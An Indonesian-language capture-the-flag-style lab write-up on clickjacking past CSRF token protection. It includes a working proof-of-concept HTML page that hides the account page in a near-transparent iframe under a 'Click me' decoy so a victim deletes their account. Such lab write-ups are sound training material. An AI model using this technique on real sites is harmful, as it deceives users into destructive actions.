# Clickjacking Dasar dengan Proteksi Token CSRF | 2 Jan 2022
## Latar Belakang
Lab ini berisi fungsionalitas login dan tombol hapus akun yang dilindungi oleh token CSRF. Seorang pengguna akan mengklik elemen yang menampilkan kata "click" di situs web umpan.

Untuk menyelesaikan lab ini, buat beberapa HTML yang membingkai halaman akun dan menipu pengguna agar menghapus akun mereka. Lab ini dianggap selesai ketika akun dihapus.

Anda dapat masuk ke akun Anda sendiri menggunakan kredensial berikut: `wiener:peter`

## Eksploitasi
### Login sebagai pengguna wiener:
![Login Screenshot](path_to_login_image)

Di sini, kita dapat memperbarui email dan menghapus akun.

### Lihat sumber halaman:
```html
<div id=account-content>
    <p>Your username is: wiener</p>
    <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
        <label>Email</label>
        <input required type="email" name="email" value="">
        <input required type="hidden" name="csrf" value="9QQV1ykloZOA78c916sgooRLy8SJZEbD">
        <button class='button' type='submit'> Update email </button>
    </form>
    <form id=delete-account-form action="/my-account/delete" method="POST">
        <input required type="hidden" name="csrf" value="9QQV1ykloZOA78c916sgooRLy8SJZEbD">
        <button class="button" type="submit">Delete account</button>
    </form>
</div>
```
Mereka menggunakan token CSRF untuk mencoba mencegah serangan CSRF.

### Membangun POC Clickjacking
Sekarang, kita akan membangun `<iframe>` tersembunyi dan teks clickbait:

```html
<html>
    <head>
        <title>Basic clickjacking with CSRF token protection</title>
        <style type="text/css">
            #targetWebsite {
                position:relative;
                width:700px;
                height:700px;
                opacity:0.0001;
                z-index:2;
            }

            #decoyWebsite {
                position:absolute;
                top:495px;
                left:60px;
                z-index:1;
            }
        </style>
    </head>
    <body>
        <div id="decoyWebsite">Click me</div>
        <iframe id="targetWebsite" src="https://0a2f006904c03654c0f5634d009f00aa.web-security-academy.net/my-account"></iframe>
    </body>
</html>
```

### Hosting dan Pengiriman ke Korban
Setelah HTML POC dibuat, host di server exploit dan kirimkan ke korban.

![Exploit Server Screenshot](path_to_exploit_server_image)

### Titik Endpoint dari Eksploitasi
Endpoint eksploitasi utama terdapat pada form hapus akun yang menerima permintaan POST ke `/my-account/delete` dengan token CSRF yang valid. Dengan memanipulasi `<iframe>` sehingga permintaan hapus akun dikirim tanpa sepengetahuan pengguna, exploit ini berhasil melewati perlindungan token CSRF karena iframe tersembunyi memiliki tingkat opasitas yang hampir tidak terlihat, memungkinkan serangan clickjacking berhasil.

